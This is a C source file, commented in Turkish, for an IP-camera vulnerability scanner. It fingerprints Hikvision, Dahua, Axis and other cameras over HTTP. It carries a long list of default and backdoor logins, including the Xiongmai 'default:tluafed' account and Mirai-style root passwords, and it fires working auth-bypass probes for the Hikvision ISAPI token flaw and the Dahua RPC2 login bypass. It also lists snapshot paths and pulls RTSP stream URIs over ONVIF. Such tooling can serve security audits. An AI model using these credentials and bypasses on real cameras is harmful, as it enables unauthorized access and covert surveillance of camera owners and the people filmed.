/*
 * camera_vuln.c — Kamera parmak izi + bilinen zafiyet sondalari + ONVIF istemcisi
 */
#include "camera_vuln.h"
#include "cam_net.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <ctype.h>
#include <time.h>

/* =====================================================================
 * Yardimcilar
 * ===================================================================== */
static int contains_ci(const char *h, const char *n) {
    if (!h || !n) return 0;
    return strcasestr(h, n) != NULL;
}

/* <tag>deger</tag> veya <ns:tag>deger</ns:tag> icinden degeri cikar. */
static int xml_val(const char *buf, const char *tag, char *out, int len) {
    out[0] = '\0';
    if (!buf) return 0;
    char needle[96];
    snprintf(needle, sizeof(needle), ":%s>", tag);
    const char *p = strstr(buf, needle);
    if (!p) {
        snprintf(needle, sizeof(needle), "<%s>", tag);
        p = strstr(buf, needle);
        if (!p) return 0;
    }
    p = strchr(p, '>');
    if (!p) return 0;
    p++;
    const char *e = strchr(p, '<');
    if (!e) return 0;
    int n = (int)(e - p);
    if (n <= 0 || n >= len) { if (n >= len) n = len - 1; if (n <= 0) return 0; }
    memcpy(out, p, n); out[n] = '\0';
    return out[0] ? 1 : 0;
}

/* key=value (satir sonuna/&'e kadar) — Dahua/param CGI bicimi. */
static int kv_val(const char *buf, const char *key, char *out, int len) {
    out[0] = '\0';
    if (!buf) return 0;
    const char *p = buf;
    int kl = (int)strlen(key);
    while ((p = strcasestr(p, key)) != NULL) {
        const char *q = p + kl;
        if (*q == '=' ) {
            q++;
            int n = 0;
            while (q[n] && q[n] != '\r' && q[n] != '\n' && q[n] != '&' && n < len - 1) { out[n] = q[n]; n++; }
            out[n] = '\0';
            if (n) return 1;
        }
        p = q;
    }
    return 0;
}

/* Once XML, sonra key=value dene; anahtar varyantlarini dener. */
static int extract_field(const char *body, const char *const *keys, int nk,
                         char *out, int len) {
    for (int i = 0; i < nk; i++) {
        if (xml_val(body, keys[i], out, len)) return 1;
    }
    for (int i = 0; i < nk; i++) {
        if (kv_val(body, keys[i], out, len)) return 1;
    }
    return 0;
}

/* =====================================================================
 * Genis varsayilan kimlik veritabani
 * ===================================================================== */
static const CamCred k_default_creds[] = {
    /* En yaygin */
    {"admin", "admin"},      {"admin", ""},          {"admin", "12345"},
    {"admin", "password"},   {"admin", "1234"},      {"admin", "123456"},
    {"admin", "1234567890"}, {"admin", "admin123"},  {"admin", "admin12345"},
    {"admin", "111111"},     {"admin", "888888"},    {"admin", "666666"},
    {"admin", "abc123"},     {"admin", "54321"},     {"admin", "9999"},
    {"admin", "pass"},       {"admin", "pass123"},   {"admin", "root"},
    {"admin", "system"},     {"admin", "hikvision"}, {"admin", "dahua"},
    {"admin", "12345678"},   {"admin", "1"},         {"admin", "0"},
    {"admin", "123123"},     {"admin", "qwerty"},    {"admin", "abc12345"},
    {"admin", "123456789"},  {"admin", "admin888"},  {"admin", "Admin123"},
    /* root */
    {"root", "root"},        {"root", ""},           {"root", "pass"},
    {"root", "12345"},       {"root", "123456"},     {"root", "admin"},
    {"root", "toor"},        {"root", "vizxv"},      {"root", "xc3511"},
    /* Klasik IoT / Xiongmai backdoor */
    {"default", "tluafed"},  {"default", "default"}, {"xm", "xm"},
    {"Xm", "Xm"},            {"admin", "tlJwpbo6"},  {"root", "tlJwpbo6"},
    {"system", "system"},    {"admin", "xm"},
    /* Ureticiye ozel */
    {"ubnt", "ubnt"},        {"service", "service"}, {"administrator", "administrator"},
    {"Administrator", "12345"},{"Admin", "12345"},   {"admin", "meinsm"},
    {"admin", "foscam"},     {"admin", "foscamadmin"},{"supervisor", "supervisor"},
    {"Admin", ""},           {"root", "cat1029"},    {"admin", "vstarcam2015"},
    {"support", "support"},  {"user", "user"},       {"guest", "guest"},
    {"admin", "ivdev"},      {"admin", "4321"},      {"admin", "4321"},
    {"admin", "11111111"},   {"admin", "88888888"},  {"admin", "12345admin"},
    {"admin", "Admin288"},   {"admin", "5544"},
    {NULL, NULL}
};

const CamCred *camera_vuln_default_creds(int *count) {
    int n = 0;
    while (k_default_creds[n].user) n++;
    if (count) *count = n;
    return k_default_creds;
}

int camera_vuln_load_wordlist(const char *path, CamCred **out, int max_lines) {
    if (out) *out = NULL;
    if (!path || !path[0]) return 0;
    FILE *fp = fopen(path, "r");
    if (!fp) return 0;
    CamCred *list = (CamCred *)calloc((size_t)max_lines + 1, sizeof(CamCred));
    if (!list) { fclose(fp); return 0; }
    int n = 0;
    char line[256];
    while (n < max_lines && fgets(line, sizeof(line), fp)) {
        /* kirp */
        char *s = line;
        while (*s == ' ' || *s == '\t') s++;
        char *e = s + strlen(s);
        while (e > s && (e[-1] == '\n' || e[-1] == '\r' || e[-1] == ' ' || e[-1] == '\t')) *--e = '\0';
        if (!*s || *s == '#') continue;
        char *colon = strchr(s, ':');
        char ubuf[256], pbuf[256];
        if (colon) {
            int ul = (int)(colon - s);
            if (ul > 255) ul = 255;
            memcpy(ubuf, s, ul); ubuf[ul] = '\0';
            snprintf(pbuf, sizeof(pbuf), "%s", colon + 1);
        } else {
            snprintf(ubuf, sizeof(ubuf), "admin");
            snprintf(pbuf, sizeof(pbuf), "%s", s);
        }
        list[n].user = strdup(ubuf);
        list[n].pass = strdup(pbuf);
        if (!list[n].user || !list[n].pass) break;
        n++;
    }
    fclose(fp);
    if (out) *out = list;
    else camera_vuln_free_wordlist(list);
    return n;
}

void camera_vuln_free_wordlist(CamCred *list) {
    if (!list) return;
    for (int i = 0; list[i].user || list[i].pass; i++) {
        free((void *)list[i].user);
        free((void *)list[i].pass);
    }
    free(list);
}

/* =====================================================================
 * HTTP parmak izi (device info endpoint'leri)
 * ===================================================================== */
typedef struct { const char *vendor; int tls; const char *path; const char *sig; } InfoEp;

static const InfoEp k_info_eps[] = {
    {"Hikvision",       0, "/ISAPI/System/deviceInfo",                          "<DeviceInfo>"},
    {"Hikvision",       0, "/System/deviceInfo",                                "<DeviceInfo>"},
    {"Hikvision",       0, "/ISAPI/System/status",                              "<Status>"},
    {"Dahua/Amcrest",   0, "/cgi-bin/magicBox.cgi?action=getSystemInfo",        "appAutoStart"},
    {"Dahua/Amcrest",   0, "/cgi-bin/magicBox.cgi?action=getDeviceType",        "type="},
    {"Dahua/Amcrest",   0, "/cgi-bin/magicBox.cgi?action=getSerialNo",          "sn="},
    {"Dahua/Amcrest",   0, "/cgi-bin/magicBox.cgi?action=getSoftwareVersion",   "version="},
    {"Uniview",         0, "/LAPI/V1.0/System/DeviceInfo",                      "DeviceInfo"},
    {"Axis",            0, "/axis-cgi/basicdeviceinfo.cgi",                     "ProdShortName"},
    {"Axis",            0, "/axis-cgi/param.cgi?action=list&group=Properties.Device", "root.Properties"},
    {"Hanwha/Samsung",  0, "/stw-cgi/system.cgi?msubmenu=devicename&action=view","Model"},
    {"Vivotek",         0, "/cgi-bin/getparam.cgi?system_info",                 "model_name"},
    {"Vivotek",         0, "/cgi-bin/getparam.cgi",                             "model_name"},
    {"Reolink",         0, "/api.cgi?cmd=GetDevInfo",                           "model"},
    {"Foscam",          0, "/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo",             "productName"},
    {"Xiongmai/XMEye",  0, "/Login.htm",                                        "System"},
    {"Grandstream",     0, "/cgi-bin/api-getinfo.sh",                           "model"},
    {"ACTi",            0, "/cgi-bin/system?SYSTEM=SYSTEM_INFO",                "Model"},
    {"Pelco",           0, "/cgi-bin/getdeviceinfo",                            "model"},
    {"Bosch",           0, "/rcp.xml?command=0x0002",                           "RCP"},
    {"Generic",         0, "/cgi-bin/deviceinfo.cgi",                           "model"},
    {"Generic",         0, "/cgi-bin/systemInfo",                               "model"},
    {"ONVIF",           0, "/onvif/device_service",                             "onvif"},
    {NULL, 0, NULL, NULL}
};

int camera_vuln_fingerprint_http(const char *ip, int port, int tls,
                                 char *vendor, int vlen,
                                 char *model, int mlen,
                                 char *firmware, int flen,
                                 char *serial_out, int slen) {
    if (vendor && vlen) vendor[0] = '\0';
    if (model && mlen) model[0] = '\0';
    if (firmware && flen) firmware[0] = '\0';
    if (serial_out && slen) serial_out[0] = '\0';

    int hits = 0;
    char body[8192];
    for (int i = 0; k_info_eps[i].vendor; i++) {
        CamHttpResp r;
        int rc = cam_http_request(ip, port, tls, "GET", k_info_eps[i].path,
                                  NULL, NULL, 1500, body, sizeof(body), &r);
        if (rc != 0) continue;
        if (r.status != 200) continue;
        if (!contains_ci(body, k_info_eps[i].sig)) continue;

        hits++;
        const char *v = k_info_eps[i].vendor;
        if (vendor && vlen && !vendor[0] && strcasecmp(v, "Generic") != 0 && strcasecmp(v, "ONVIF") != 0)
            snprintf(vendor, vlen, "%s", v);

        if (model && mlen && !model[0]) {
            const char *mk[] = {"model", "deviceType", "deviceName", "model_name",
                                "ProdShortName", "productName", "Model", "type"};
            extract_field(body, mk, (int)(sizeof(mk)/sizeof(mk[0])), model, mlen);
        }
        if (firmware && flen && !firmware[0]) {
            const char *fk[] = {"firmwareVersion", "firmwareVersion", "version",
                                "softwareVersion", "fwVersion", "prefix"};
            extract_field(body, fk, (int)(sizeof(fk)/sizeof(fk[0])), firmware, flen);
        }
        if (serial_out && slen && !serial_out[0]) {
            const char *sk[] = {"serialNumber", "serialNo", "sn", "serial"};
            extract_field(body, sk, (int)(sizeof(sk)/sizeof(sk[0])), serial_out, slen);
        }
        if (hits >= 4) break;
    }
    return hits;
}

/* =====================================================================
 * Bilinen zafiyet / auth-bypass sondalari
 * ===================================================================== */
/* Hikvision ISAPI auth-token (CVE-2017-7921 ailesi). */
static unsigned probe_hikvision(const char *ip, int port, int tls, char *detail, int dlen) {
    unsigned mask = 0;
    char body[8192];
    const char *token = "YWRtaW46MTEK";  /* base64("admin:11\n") */

    char path[256];
    snprintf(path, sizeof(path), "/ISAPI/System/deviceInfo?auth=%s", token);
    CamHttpResp r;
    if (cam_http_request(ip, port, tls, "GET", path, NULL, NULL, 1800, body, sizeof(body), &r) == 0) {
        if (r.status == 200 && (contains_ci(body, "<DeviceInfo") || contains_ci(body, "deviceName") || contains_ci(body, "<model>"))) {
            mask |= CAM_VULN_HIK_ISAPI_TOKEN;
            snprintf(detail, dlen, "Hikvision ISAPI auth-token bilgi sizintisi (/ISAPI/System/deviceInfo)");
            return mask;
        }
    }
    snprintf(path, sizeof(path), "/System/deviceInfo?auth=%s", token);
    if (cam_http_request(ip, port, tls, "GET", path, NULL, NULL, 1800, body, sizeof(body), &r) == 0) {
        if (r.status == 200 && (contains_ci(body, "<DeviceInfo") || contains_ci(body, "deviceName"))) {
            mask |= CAM_VULN_HIK_ISAPI_TOKEN;
            snprintf(detail, dlen, "Hikvision eski auth-token bilgi sizintisi (/System/deviceInfo)");
            return mask;
        }
    }
    /* Kullanici listesi sizintisi */
    snprintf(path, sizeof(path), "/Security/users?auth=%s", token);
    if (cam_http_request(ip, port, tls, "GET", path, NULL, NULL, 1800, body, sizeof(body), &r) == 0) {
        if (r.status == 200 && (contains_ci(body, "<UserList") || contains_ci(body, "<userName"))) {
            mask |= CAM_VULN_HIK_USERS;
            if (detail[0]) strncat(detail, "; ", dlen - strlen(detail) - 1);
            strncat(detail, "Hikvision kullanici listesi sizintisi", dlen - strlen(detail) - 1);
        }
    }
    return mask;
}

/* Ham POST (application/json vb.): govde verilen icerik tipiyle gonderilir. */
static int raw_post(const char *ip, int port, int tls, const char *path,
                    const char *content_type, const char *payload,
                    char *out, int outlen, int *status_out) {
    CamConn c;
    if (cam_conn_open(&c, ip, port, 2500, tls) != 0) return -1;
    char req[4096];
    snprintf(req, sizeof(req),
             "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
             "Content-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
             path, ip, content_type, (int)strlen(payload), payload);
    if (cam_conn_write(&c, req, (int)strlen(req), 2500) <= 0) { cam_conn_close(&c); return -1; }
    int total = 0; char buf[16384];
    for (;;) {
        int n = cam_conn_read(&c, buf + total, (int)sizeof(buf) - 1 - total, 1200);
        if (n <= 0) break;
        total += n;
        if (total >= (int)sizeof(buf) - 2) break;
    }
    cam_conn_close(&c);
    if (total <= 0) return -1;
    buf[total] = '\0';
    int st = 0; char *sp = strchr(buf, ' '); if (sp) st = atoi(sp + 1);
    if (status_out) *status_out = st;
    if (out && outlen > 0) { int n = total < outlen - 1 ? total : outlen - 1; memcpy(out, buf, n); out[n] = '\0'; }
    return 0;
}

/* Dahua RPC2 kimlik atlatma (CVE-2021-33044 ailesi): kimliksiz "result":true. */
static unsigned probe_dahua(const char *ip, int port, int tls, char *detail, int dlen) {
    unsigned mask = 0;
    char body[8192];
    const char *paths[] = {"/RPC2_Login", "/RPC2", "/cgi-bin/login.cgi"};
    const char *payload =
        "{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\","
        "\"password\":\"__________\",\"clientType\":\"Web3.0\",\"loginType\":\"Direct\"},\"id\":1}";
    for (size_t i = 0; i < sizeof(paths)/sizeof(paths[0]); i++) {
        int st = 0;
        if (raw_post(ip, port, tls, paths[i], "application/json", payload, body, sizeof(body), &st) != 0)
            continue;
        if (st == 200 && (contains_ci(body, "\"result\":true") || contains_ci(body, "\"result\": true"))) {
            mask |= CAM_VULN_DAHUA_LOGIN;
            snprintf(detail, dlen, "Dahua RPC2 kimlik atlatma (kimliksiz result:true, %s)", paths[i]);
            break;
        }
    }
    return mask;
}

/* Kimliksiz device-info erisimi (jenerik). */
static unsigned probe_anon_info(const char *ip, int port, int tls, char *detail, int dlen) {
    unsigned mask = 0;
    char body[8192];
    const char *paths[] = {"/ISAPI/System/deviceInfo", "/cgi-bin/magicBox.cgi?action=getSystemInfo",
                           "/system.ini?loginuse&loginpas", "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo"};
    for (size_t i = 0; i < sizeof(paths)/sizeof(paths[0]); i++) {
        CamHttpResp r;
        if (cam_http_request(ip, port, tls, "GET", paths[i], NULL, NULL, 1500, body, sizeof(body), &r) != 0) continue;
        if (r.status == 200 &&
            (contains_ci(body, "<DeviceInfo") || contains_ci(body, "appAutoStart") ||
             contains_ci(body, "serverName") || contains_ci(body, "deviceType"))) {
            mask |= CAM_VULN_ANON_INFO;
            snprintf(detail, dlen, "Kimliksiz device-info erisimi (%s)", paths[i]);
            break;
        }
    }
    return mask;
}

/* Xiongmai arka kapi hesabi (default:tluafed). */
static unsigned probe_xiongmai(const char *ip, int port, int tls, char *detail, int dlen) {
    char raw[64], b64[128], auth[160];
    snprintf(raw, sizeof(raw), "default:tluafed");
    cam_b64_encode((const unsigned char *)raw, (int)strlen(raw), b64, sizeof(b64));
    snprintf(auth, sizeof(auth), "Authorization: Basic %s\r\n", b64);
    char body[2048];
    CamHttpResp r;
    if (cam_http_request(ip, port, tls, "GET", "/", NULL, auth, 1500, body, sizeof(body), &r) == 0) {
        if (r.status == 200) {
            snprintf(detail, dlen, "Xiongmai arka kapi hesabi kabul edildi (default:tluafed)");
            return CAM_VULN_XIONGMAI_BACKDOOR;
        }
    }
    return 0;
}

unsigned camera_vuln_probe_authbypass(const char *ip, int port, int tls,
                                      const char *vendor_hint,
                                      char *detail, int dlen) {
    if (detail && dlen) detail[0] = '\0';
    unsigned mask = 0;
    char d[256]; d[0] = '\0';

    int do_hik = !vendor_hint || contains_ci(vendor_hint, "hikvision") || contains_ci(vendor_hint, "ezviz");
    int do_dah = !vendor_hint || contains_ci(vendor_hint, "dahua") || contains_ci(vendor_hint, "amcrest") || contains_ci(vendor_hint, "lorex");
    int do_xio = !vendor_hint || contains_ci(vendor_hint, "xiong") || contains_ci(vendor_hint, "xmeye") || contains_ci(vendor_hint, "netwave") || contains_ci(vendor_hint, "vstarcam");

    if (do_hik) { unsigned m = probe_hikvision(ip, port, tls, d, sizeof(d)); if (m) { mask |= m; strncpy(detail, d, dlen - 1); detail[dlen-1]='\0'; } }
    if (do_dah) { unsigned m = probe_dahua(ip, port, tls, d, sizeof(d));    if (m) { mask |= m; if (!detail[0]) { strncpy(detail, d, dlen - 1); detail[dlen-1]='\0'; } } }
    if (do_xio) { unsigned m = probe_xiongmai(ip, port, tls, d, sizeof(d)); if (m) { mask |= m; if (!detail[0]) { strncpy(detail, d, dlen - 1); detail[dlen-1]='\0'; } } }
    { unsigned m = probe_anon_info(ip, port, tls, d, sizeof(d)); if (m) { mask |= m; if (!detail[0]) { strncpy(detail, d, dlen - 1); detail[dlen-1]='\0'; } } }
    return mask;
}

/* =====================================================================
 * Snapshot yollari
 * ===================================================================== */
static const char *k_snapshot_paths[] = {
    "/ISAPI/Streaming/channels/101/picture",   /* Hikvision */
    "/ISAPI/Streaming/channels/1/picture",
    "/cgi-bin/snapshot.cgi",                   /* Dahua */
    "/cgi-bin/snapshot.cgi?channel=1",
    "/onvif-http/snapshot",                    /* ONVIF jenerik */
    "/onvif/snapshot",
    "/axis-cgi/jpg/image.cgi",                 /* Axis */
    "/cgi-bin/video.jpg",                      /* jenerik */
    "/snapshot.jpg",
    "/snap.jpg",
    "/img/snapshot.cgi",
    "/tmpfs/auto.jpg",
    "/video.cgi",
    "/mjpg/video.mjpg",
    "/stream.mjpg",
    NULL
};
const char *const *camera_vuln_snapshot_paths(int *count) {
    int n = 0; while (k_snapshot_paths[n]) n++;
    if (count) *count = n;
    return k_snapshot_paths;
}

/* =====================================================================
 * ONVIF device-service istemcisi
 * ===================================================================== */
static void iso8601_utc(char *out, int len) {
    time_t t = time(NULL);
    struct tm g;
    gmtime_r(&t, &g);
    strftime(out, len, "%Y-%m-%dT%H:%M:%SZ", &g);
}

/* WS-Security UsernameToken baslik blogu uretir. */
static void ws_username_token(const char *user, const char *pass, char *out, int outlen) {
    unsigned char nonce_raw[16];
    for (int i = 0; i < 16; i++) nonce_raw[i] = (unsigned char)(rand() & 0xFF);
    char nonce_b64[64], created[40], digest_b64[64];
    cam_b64_encode(nonce_raw, 16, nonce_b64, sizeof(nonce_b64));
    iso8601_utc(created, sizeof(created));

    unsigned char buf[256];
    int n = 0;
    memcpy(buf + n, nonce_raw, 16); n += 16;
    n += snprintf((char *)buf + n, sizeof(buf) - n, "%s", created);
    n += snprintf((char *)buf + n, sizeof(buf) - n, "%s", pass ? pass : "");
    cam_sha1_b64(buf, (size_t)n, digest_b64, sizeof(digest_b64));

    snprintf(out, outlen,
        "<s:Header><wsse:Security "
        "xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\" "
        "xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\" "
        "s:mustUnderstand=\"1\"><wsse:UsernameToken>"
        "<wsse:Username>%s</wsse:Username>"
        "<wsse:Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest\">%s</wsse:Password>"
        "<wsse:Nonce EncodingType=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary\">%s</wsse:Nonce>"
        "<wsu:Created>%s</wsu:Created>"
        "</wsse:UsernameToken></wsse:Security></s:Header>",
        user ? user : "", digest_b64, nonce_b64, created);
}

/* SOAP POST (govde verilen baslik + zarf). auth_mode:
 *   0 none, 1 WS-UsernameToken, 2 Basic, 3 Digest(once 401 gerekir) */
static int onvif_soap(const char *ip, int port, int tls, const char *path,
                      const char *body_xml, const char *user, const char *pass,
                      int auth_mode, char *out, int outlen, int *auth_used) {
    char extra[2048];
    extra[0] = '\0';
    if (auth_mode == 1 && user && user[0]) {
        char ws[1400];
        ws_username_token(user, pass, ws, sizeof(ws));
        snprintf(extra, sizeof(extra),
                 "Content-Type: application/soap+xml; charset=utf-8\r\n%s", ws);
    } else if (auth_mode == 2 && user && user[0]) {
        char raw[160], b64[256];
        snprintf(raw, sizeof(raw), "%s:%s", user, pass ? pass : "");
        cam_b64_encode((const unsigned char *)raw, (int)strlen(raw), b64, sizeof(b64));
        snprintf(extra, sizeof(extra),
                 "Content-Type: application/soap+xml; charset=utf-8\r\n"
                 "Authorization: Basic %s\r\n", b64);
    } else {
        snprintf(extra, sizeof(extra), "Content-Type: application/soap+xml; charset=utf-8\r\n");
    }

    CamConn c;
    if (cam_conn_open(&c, ip, port, 2500, tls) != 0) return -1;

    char req[6144];
    snprintf(req, sizeof(req),
             "POST %s HTTP/1.1\r\nHost: %s\r\nAccept-Encoding: gzip, deflate\r\n"
             "SOAPAction: \"\"\r\n%sContent-Length: %d\r\nConnection: close\r\n\r\n%s",
             path, ip, extra, (int)strlen(body_xml), body_xml);
    if (cam_conn_write(&c, req, (int)strlen(req), 2500) <= 0) { cam_conn_close(&c); return -1; }

    /* Yaniti oku */
    int total = 0;
    char rbuf[16384];
    for (;;) {
        int n = cam_conn_read(&c, rbuf + total, (int)sizeof(rbuf) - 1 - total, 1500);
        if (n <= 0) break;
        total += n;
        if (total > (int)sizeof(rbuf) - 2) break;
    }
    cam_conn_close(&c);
    if (total <= 0) return -1;
    rbuf[total] = '\0';

    /* 401 ise Digest icin WWW-Authenticate cikar */
    int status = 0;
    char *sp = strchr(rbuf, ' ');
    if (sp) status = atoi(sp + 1);

    /* Digest: 401 challenge'a karsi Authorization'i uretip tek kez yeniden gonder.
     * (Ozyineleme YOK: onvif_soap'i tekrar cagirmak sonsuz dongu yaratiyordu.) */
    if (status == 401 && auth_mode == 3 && user && user[0]) {
        const char *w = strcasestr(rbuf, "WWW-Authenticate:");
        if (w && strcasestr(w, "digest")) {
            char authhdr[768];
            cam_http_digest_header(user, pass, w, "POST", path, authhdr, sizeof(authhdr));
            CamConn c2;
            if (cam_conn_open(&c2, ip, port, 2500, tls) == 0) {
                char req2[6144];
                snprintf(req2, sizeof(req2),
                         "POST %s HTTP/1.1\r\nHost: %s\r\nAccept-Encoding: gzip, deflate\r\n"
                         "SOAPAction: \"\"\r\nContent-Type: application/soap+xml; charset=utf-8\r\n"
                         "%sContent-Length: %d\r\nConnection: close\r\n\r\n%s",
                         path, ip, authhdr, (int)strlen(body_xml), body_xml);
                if (cam_conn_write(&c2, req2, (int)strlen(req2), 2500) > 0) {
                    int t2 = 0;
                    char rb2[16384];
                    for (;;) {
                        int n2 = cam_conn_read(&c2, rb2 + t2, (int)sizeof(rb2) - 1 - t2, 1500);
                        if (n2 <= 0) break;
                        t2 += n2;
                        if (t2 > (int)sizeof(rb2) - 2) break;
                    }
                    if (t2 > 0) {
                        rb2[t2] = '\0';
                        status = 0;
                        char *s2 = strchr(rb2, ' ');
                        if (s2) status = atoi(s2 + 1);
                        if (out && outlen > 0) {
                            int n = t2 < outlen - 1 ? t2 : outlen - 1;
                            memcpy(out, rb2, n); out[n] = '\0';
                        }
                        if (auth_used) *auth_used = 3;
                        cam_conn_close(&c2);
                        return status;
                    }
                }
                cam_conn_close(&c2);
            }
        }
    }

    if (out && outlen > 0) {
        int n = total < outlen - 1 ? total : outlen - 1;
        memcpy(out, rbuf, n); out[n] = '\0';
    }
    return status;
}

static const char *k_dev_paths[] = {
    "/onvif/device_service", "/onvif/device_service/", "/onvif/services",
    "/onvif/device", "/device_service", "/onvif/devicemgmt", "/onvif/Device",
    NULL
};
static const char *k_media_paths[] = {
    "/onvif/media_service", "/onvif/media_service/", "/onvif/Media",
    "/onvif/media", "/onvif/MediaService", NULL
};

static const char *SOAP_GETDEVINFO =
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">"
    "%s"
    "<s:Body><tds:GetDeviceInformation xmlns:tds=\"http://www.onvif.org/ver10/device/wsdl\"/></s:Body>"
    "</s:Envelope>";

static const char *SOAP_GETPROFILES =
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">"
    "%s"
    "<s:Body><trt:GetProfiles xmlns:trt=\"http://www.onvif.org/ver10/media/wsdl\"/></s:Body>"
    "</s:Envelope>";

int onvif_probe_device(const char *ip, int port, int tls,
                       const char *user, const char *pass,
                       OnvifDeviceInfo *out) {
    if (!out) return -1;
    memset(out, 0, sizeof(*out));

    char devpath[128] = "";
    char body[16384];
    char xml[2048];
    int auth_modes[4] = {0, 0, 0, 0};
    int nm = 0;
    if (user && user[0]) { auth_modes[nm++] = 1; auth_modes[nm++] = 2; auth_modes[nm++] = 3; }
    auth_modes[nm++] = 0;

    /* Calisan device path + auth modunu bul */
    int auth_used = 0;
    int got = 0;
    for (int p = 0; k_dev_paths[p] && !got; p++) {
        for (int a = 0; a < nm && !got; a++) {
            char wsblk[1600]; wsblk[0] = '\0';
            if (auth_modes[a] == 1 && user && user[0]) ws_username_token(user, pass, wsblk, sizeof(wsblk));
            snprintf(xml, sizeof(xml), SOAP_GETDEVINFO, wsblk);
            int st = onvif_soap(ip, port, tls, k_dev_paths[p], xml, user, pass,
                                auth_modes[a], body, sizeof(body), &auth_used);
            if (st <= 0) continue;
            if (st == 200 && (contains_ci(body, "GetDeviceInformationResponse") || contains_ci(body, "Manufacturer"))) {
                snprintf(devpath, sizeof(devpath), "%s", k_dev_paths[p]);
                out->auth_used = auth_modes[a];
                got = 1;
            }
        }
    }
    if (!got) return -1;

    xml_val(body, "Manufacturer", out->manufacturer, sizeof(out->manufacturer));
    xml_val(body, "Model", out->model, sizeof(out->model));
    xml_val(body, "FirmwareVersion", out->firmware, sizeof(out->firmware));
    xml_val(body, "SerialNumber", out->serial, sizeof(out->serial));

    /* Media path + profil token */
    char mediapath[128] = "";
    char profile_token[128] = "";
    for (int p = 0; k_media_paths[p]; p++) {
        char wsblk[1600]; wsblk[0] = '\0';
        if (out->auth_used == 1 && user && user[0]) ws_username_token(user, pass, wsblk, sizeof(wsblk));
        snprintf(xml, sizeof(xml), SOAP_GETPROFILES, wsblk);
        int st = onvif_soap(ip, port, tls, k_media_paths[p], xml, user, pass,
                            out->auth_used, body, sizeof(body), &auth_used);
        if (st == 200 && (contains_ci(body, "GetProfilesResponse") || contains_ci(body, "Profiles"))) {
            snprintf(mediapath, sizeof(mediapath), "%s", k_media_paths[p]);
            /* ilk profile token */
            const char *t = strstr(body, "token=\"");
            if (t) {
                t += 7;
                const char *e = strchr(t, '"');
                if (e) { int n = (int)(e - t); if (n > 127) n = 127; memcpy(profile_token, t, n); profile_token[n] = '\0'; }
            }
            break;
        }
    }
    if (mediapath[0]) {
        snprintf(out->media_xaddr, sizeof(out->media_xaddr), "http://%s%s", ip, mediapath);
        if (profile_token[0]) {
            char wsblk[1600]; wsblk[0] = '\0';
            if (out->auth_used == 1 && user && user[0]) ws_username_token(user, pass, wsblk, sizeof(wsblk));
            char gsu[2560];
            snprintf(gsu, sizeof(gsu),
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">%s"
                "<s:Body><trt:GetStreamUri xmlns:trt=\"http://www.onvif.org/ver10/media/wsdl\" "
                "xmlns:tt=\"http://www.onvif.org/ver10/schema\">"
                "<trt:StreamSetup><tt:Stream>RTP-Unicast</tt:Stream>"
                "<tt:Transport><tt:Protocol>RTSP</tt:Protocol></tt:Transport></trt:StreamSetup>"
                "<trt:ProfileToken>%s</trt:ProfileToken></trt:GetStreamUri></s:Body></s:Envelope>",
                wsblk, profile_token);
            int st = onvif_soap(ip, port, tls, mediapath, gsu, user, pass,
                                out->auth_used, body, sizeof(body), &auth_used);
            if (st == 200 && (contains_ci(body, "GetStreamUriResponse") || contains_ci(body, "rtsp://"))) {
                if (!xml_val(body, "Uri", out->stream_uri, sizeof(out->stream_uri))) {
                    const char *u = strstr(body, "rtsp://");
                    if (u) {
                        int n = 0;
                        while (u[n] && u[n] != '<' && u[n] != ' ' && n < 255) n++;
                        memcpy(out->stream_uri, u, n); out->stream_uri[n] = '\0';
                    }
                }
            }
        }
    }
    return 0;
}
